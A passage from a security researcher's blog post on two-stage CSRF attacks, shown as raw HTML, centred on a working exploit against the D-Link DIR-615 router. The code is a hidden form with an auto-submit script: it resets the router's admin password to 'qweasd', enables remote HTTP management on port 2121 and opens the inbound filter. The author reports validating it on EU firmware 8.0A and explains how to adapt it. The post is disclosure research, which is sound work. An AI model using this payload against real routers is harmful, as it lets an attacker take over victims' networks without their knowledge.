			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="Contains Mixed Languages"></span><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&lt;form name="adminForm" method="POST" action="http://192.168.0.1/tools_admin.htm"&gt;
	&lt;input type="hidden" name="page" value="tools_admin" /&gt;
	&lt;input type="hidden" name="admin_password1" value="qweasd" /&gt;
	&lt;input type="hidden" name="admin_password2" value="qweasd" /&gt;
	&lt;input type="hidden" name="hostname" value="REMOTEENABLED" /&gt;
	&lt;input type="hidden" name="graphical_enable" value="1" /&gt;
	&lt;input type="hidden" name="remote_enable" value="1" /&gt;
	&lt;input type="hidden" name="remote_http_management_port" value="2121" /&gt;
	&lt;input type="hidden" name="remote_inbound_filter" value="11" /&gt;
&lt;/form&gt;

&lt;script type="text/javascript"&gt;
	window.setTimeout(doFormSubmit, 5000);
	function doFormSubmit()
	{
		document.adminForm.submit();
	}
&lt;/script&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98772e862e760724886-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e862e760724886-2">2</div><div class="crayon-num" data-line="crayon-53c98772e862e760724886-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e862e760724886-4">4</div><div class="crayon-num" data-line="crayon-53c98772e862e760724886-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e862e760724886-6">6</div><div class="crayon-num" data-line="crayon-53c98772e862e760724886-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e862e760724886-8">8</div><div class="crayon-num" data-line="crayon-53c98772e862e760724886-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e862e760724886-10">10</div><div class="crayon-num" data-line="crayon-53c98772e862e760724886-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e862e760724886-12">12</div><div class="crayon-num" data-line="crayon-53c98772e862e760724886-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e862e760724886-14">14</div><div class="crayon-num" data-line="crayon-53c98772e862e760724886-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e862e760724886-16">16</div><div class="crayon-num" data-line="crayon-53c98772e862e760724886-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e862e760724886-18">18</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98772e862e760724886-1"><span class="crayon-o">&lt;</span><span class="crayon-e">form </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"adminForm"</span><span class="crayon-h"> </span><span class="crayon-v">method</span><span class="crayon-o">=</span><span class="crayon-s">"POST"</span><span class="crayon-h"> </span><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-s">"http://192.168.0.1/tools_admin.htm"</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e862e760724886-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"page"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"tools_admin"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98772e862e760724886-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"admin_password1"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"qweasd"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e862e760724886-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"admin_password2"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"qweasd"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98772e862e760724886-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"hostname"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"REMOTEENABLED"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e862e760724886-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"graphical_enable"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"1"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98772e862e760724886-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"remote_enable"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"1"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e862e760724886-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"remote_http_management_port"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"2121"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98772e862e760724886-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"remote_inbound_filter"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"11"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e862e760724886-10"><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-e">form</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98772e862e760724886-11">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e862e760724886-12"><span class="crayon-ta">&lt;script </span><span class="crayon-e ">type</span><span class="crayon-o">=</span><span class="crayon-s">"text/javascript"</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98772e862e760724886-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">window</span><span class="crayon-sy">.</span><span class="crayon-e">setTimeout</span><span class="crayon-sy">(</span><span class="crayon-i">doFormSubmit</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">5000</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e862e760724886-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">doFormSubmit</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-53c98772e862e760724886-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e862e760724886-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">document</span><span class="crayon-sy">.</span><span class="crayon-v">adminForm</span><span class="crayon-sy">.</span><span class="crayon-e">submit</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98772e862e760724886-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e862e760724886-18"><span class="crayon-ta">&lt;/script&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0066 seconds] -->
<p>The key here is that while the first login iFrame is loaded straight away, we have to wait to make sure that the request happened. This could be anything from 5ms to a second. In this case, we wait 5000ms to be safe. This could likely be lowered a lot.</p>
<p>This was validated against the EU version of the D-Link DIR-615 with 8.0A firmware. And while it probably could be optimized quite a bit and made a lot prettier/subtle, it addresses something which I couldn&#8217;t find a solution to easily on Google/WAHHv2. This could potentially be a lot simpler against a target that accepts a GET requests to do the same. But this will work for both by simply changing the method in the form.</p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="http://ceriksen.com/category/security/" title="View all posts in Security" rel="category tag">Security</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="http://ceriksen.com/tag/csrf/" rel="tag">CSRF</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="http://ceriksen.com/2012/09/29/two-stage-csrf-attacks/#comments" title="Comment on Two-stage CSRF attacks">6 Comments</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-142 -->

				
					<nav id="nav-below">
		<h2 class="assistive-text">Post navigation</h2>

	
	</nav><!-- #nav-below -->
	
			
			</div><!-- #content -->
		</section><!-- #primary -->

			<div id="secondary" class="widget-area" role="complementary">
			<aside id="text-2" class="widget widget_text"><h3 class="widget-title">Upcoming advisories</h3>			<div class="textwidget"><p>SA51412<br />
SA51348<br />
SA51344<br />
SA51336 </p>
</div>
		</aside><aside id="categories-4" class="widget widget_categories"><h3 class="widget-title">Categories</h3>		<ul>
	<li class="cat-item cat-item-3"><a href="http://ceriksen.com/category/advisories/" title="View all posts filed under Advisories">Advisories</a> (34)
</li>
	<li class="cat-item cat-item-12"><a href="http://ceriksen.com/category/privacy/" title="View all posts filed under Privacy">Privacy</a> (5)
</li>
	<li class="cat-item cat-item-30 current-cat"><a href="http://ceriksen.com/category/security/" title="View all posts filed under Security">Security</a> (7)
</li>
		</ul>
</aside>		<aside id="recent-posts-4" class="widget widget_recent_entries">		<h3 class="widget-title">Recent posts</h3>		<ul>
					<li>
				<a href="http://ceriksen.com/2013/08/20/graphite-remote-code-execution-vulnerability-advisory/">Graphite remote code execution vulnerability advisory</a>
						</li>
					<li>
				<a href="http://ceriksen.com/2013/08/06/squash-remote-code-execution-vulnerability-advisory/">Squash remote code execution vulnerability advisory</a>
						</li>
					<li>
				<a href="http://ceriksen.com/2013/06/18/bsides-rhode-island-presentation-and-slides/">BSides Rhode Island presentation and slides</a>
						</li>
					<li>
				<a href="http://ceriksen.com/2013/05/24/cve-2012-6399-or-how-your-cisco-webex-meetings-arent-very-confidential-on-ios/">CVE-2012-6399 &#8211; Or how your Cisco WebEx meetings aren&#8217;t very confidential on iOS</a>
						</li>
					<li>
				<a href="http://ceriksen.com/2013/05/16/credit-card-numbers-third-parties-and-you/">Credit card numbers, third parties and you</a>
						</li>
					<li>
				<a href="http://ceriksen.com/2013/05/09/cve-2013-2692-or-when-your-openvpn-is-a-bit-too-open/">CVE-2013-2692 &#8211; Or when your OpenVPN is a bit too open</a>
						</li>
					<li>
				<a href="http://ceriksen.com/2013/05/03/conditional-csrf-or-how-to-spray-without-praying/">Conditional CSRF &#8211; Or how to spray without praying</a>
						</li>
					<li>
				<a href="http://ceriksen.com/2013/05/01/wordpress-csrf-exploit-kit-a-novel-approach-to-exploiting-wordpress-plugins/">WordPress CSRF Exploit kit &#8211; A novel approach to exploiting WordPress plugins</a>
						</li>
					<li>
				<a href="http://ceriksen.com/2013/03/17/amd-catalyst-driver-update-vulnerability/">AMD Catalyst driver update vulnerability</a>
						</li>
					<li>
				<a href="http://ceriksen.com/2013/02/18/wordpress-online-store-local-file-inclusion-vulnerability/">WordPress Online Store local file inclusion vulnerability</a>
						</li>
				</ul>
		</aside>		</div><!-- #secondary .widget-area -->
	
	</div><!-- #main -->
	
	
	<footer id="colophon" role="contentinfo">
		<div id="site-generator">
						<a href="http://wordpress.org/" title="Semantic Personal Publishing Platform" rel="generator">Powered by WordPress</a> &amp;	<a href="http://wpshoppe.com/" title="Minimalist WordPress Themes" rel="generator">simpleX</a>.
					
		</div>
	</footer><!-- #colophon -->
	
		
</div><!-- #page -->


</body>
</html>
<!-- Performance optimized by W3 Total Cache. Learn more: http://www.w3-edge.com/wordpress-plugins/

Page Caching using disk: enhanced

 Served from: ceriksen.com @ 2014-07-18 20:45:39 by W3 Total Cache -->